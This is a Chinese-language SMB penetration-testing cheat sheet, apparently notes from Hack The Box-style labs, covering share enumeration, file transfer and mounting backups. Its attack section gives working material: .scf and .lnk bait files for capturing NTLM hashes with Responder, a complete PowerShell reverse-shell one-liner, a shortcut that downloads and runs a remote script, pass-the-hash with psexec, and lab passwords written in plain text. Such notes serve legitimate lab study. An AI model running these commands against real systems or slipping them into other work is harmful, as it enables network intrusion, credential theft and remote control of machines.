MMicrosoft-DS（DirectSMB），一种现代的 SMB 协议实现

**可以上传的 smb 共享：扫描共享目录路径**
```bash
nmap --script=smb-enum-shares.nse -p445 <IP>
```

**检查 SMB 漏洞(Windows)**
```
nmap -T5 -sV --script 'smb-vuln*'
```

**smbclient**
```bash
smbclient //hathor.windcorp.htb/share -k -U BeatriceMill@windcorp.htb -N
```

**samba 服务枚举详细**
```bash
enum4linux 
```

**wget 批量下载**
```bash
wget -m ftp://anonymous:xxx@[IP/Domain]
```

**共享目录枚举**
```bash
smbclient -L
smbmap -H 
crackmapexec smb IP -u '' -p '' --shares   (-u '' 有时候不准 可以随便输入一个username)
crackmapexec smb hathor.windcorp.htb -d windcorp.htb -u BeatriceMill -p '!!!!ilovegood17' -k  --shares  (-d指定DOMAIN)
cme smb <IP> -u <Username> -p <Password>
```

**搭建本地 samba 共享服务** (文件传输)

- 靶机下载 kali 中的文件
```bash
sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share .
```

- 靶机文件传输到 kali
```bash
/usr/share/doc/python3-impacket/examples/smbserver.py share . -user xekoner -pass xekoner [-smb2support]
net use \\10.10.14.18\share /u:xekoner xekoner 
copy xxx \\10.10.14.18\share
```

- Windows > Kali
```bash
/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support  (kali)
net view \\10.10.14.39\share
copy FILE \\10.10.14.39\share
```

**Windows 本地挂载**
适用于：打域内网无法直接连接的情况，可以 mount 到本地
```bash
sudo mount -t cifs //10.129.136.29/Backups ./smbmount/
sudo mount -t cifs //BLACKFIELD.local/forensic ./SMBMOUNT -o username=audit2020
sudo mount -t cifs //htb.local/backup /mnt -o rw,guest,vers=1.0  (Anonymous 挂载)
sudo mount -t cifs //172.16.206.21/monitoring /mnt/monitoring -o username=mountuser,password='DRtajyCwcbWvH/9',domain=relia.com
```

**挂载 vhd 虚拟磁盘文件**

检查挂载磁盘

```bash
sudo guestfish --ro -a ./smbmount/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd 
```

然后输入 run ；再输入 list-filesystems 查看虚拟磁盘格式

把 vhd 文件挂载到/tmp/mnt 下
```bash
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/mnt
```

**敏感目录**
Windows/System32/config 下的 **SAM** 和 **SYSTEM** ，可以提取用户凭据 hash ,详细破解看 [Winodws , Active Directory系列](../Winodws%20,%20Active%20Directory系列.md)

结束挂载 
```bash
guestunmount /tmp/mnt
```


**爆破 RID 枚举用户名**
```bash
crackmapexec smb rebound.htb -u QWE -p '' --rid-brute > RID_raw
netexec smb 10.10.11.16 -u guest -p '' --rid-brute
```


### 攻击向量
- **Responder 获取 NTLM Hash**
**是否有可以写入的文件夹 ?** 
有上传文件的功能，文件可以被上传到 smb 共享文件夹内，那就可能可以获取 user 的 hash
**原理 ：**
Windows 资源管理器 Shell 命令文件 ( `.scf` ) 让 Windows 在用户访问包含该文件的目录时打开 SMB 连接
`.scf` 是一个文本文件，可以包含远程图标路径; 

```1.scf
[Shell]
Command=2 

IconFile=\\10.10.14.29\icon
```
上传这个.scf 文件，然后 responder 监听, -i 指定网卡


!!!!!!!!!!!!!!!!! **如果有存在写入的共享文件（未获得 shell）**!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
https://github.com/Greenwolf/ntlm_theft
尝试使用所有可能的文件上传，尝试用 responder get ntlmv2 hash
```bashh
python ~/tools/ntlm_theft/ntlm_theft.py -g all -s LOCALIP -f xekoner
cd xekoner
smbclient //IP/Dir -U User
	prompt off
	mput *
sudo responder -I tun0
```


- **检查主机是否存在 smb 共享文件夹**
```cmd
hostname
net view \\MS01
```

- **上传.lnk 文件获得 NTLM Hash**
https://github.com/xct/hashgrab
```bash
python ~/tools/hashgrab/hashgrab.py 192.168.45.170 this
smb: \Documents\> put this.lnk
sudo responder -I tun0 -A
```

- **创建一个.lnk 文件，等待有人点击后得到反向 shell**
rev.ps1
```bash
$c = New-Object Net.Sockets.TCPClient('10.10.16.21',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close()
```

```powershell
PS C:\Common Applications> $WScriptShell = New-Object -ComObject WScript.Shell 
PS C:\Common Applications> $Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk") 
PS C:\Common Applications> $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
PS C:\Common Applications> $Shortcut.Arguments = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.21/rev.ps1')" 
PS C:\Common Applications> $Shortcut.Save()
```

- **psexec.py**
![](photos/Pasted%20image%2020240205215420.png)

```bash
/usr/share/doc/python3-impacket/examples/psexec.py Administrador:U46olsZ3jp1ZN4i2Hv7R@10.129.108.107
/usr/share/doc/python3-impacket/examples/psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
```


- **smbclient.py**
```
python /usr/share/doc/python3-impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local 
[-k 强制使用kerbrute验证,用于无法使用NTLM验证的时候]

shares 枚举共享目录
use xxx
ls
get xxx
```

### Issue
**CME: KDC_ERR_WRONG_REALM 问题**
指定 -d 
```bash
crackmapexec smb hathor.windcorp.htb -u BeatriceMill -p '!!!!ilovegood17' -k -d windcorp.htb --shares
```

**smbclient: NT_STATUS_INVALID_PARAMETER 问题**
修改 /etc/krb5.conf, kinit 验证后再次执行
```bash
smbclient -k -U BeatriceMill@windcorp.htb //hathor.windcorp.htb/share
```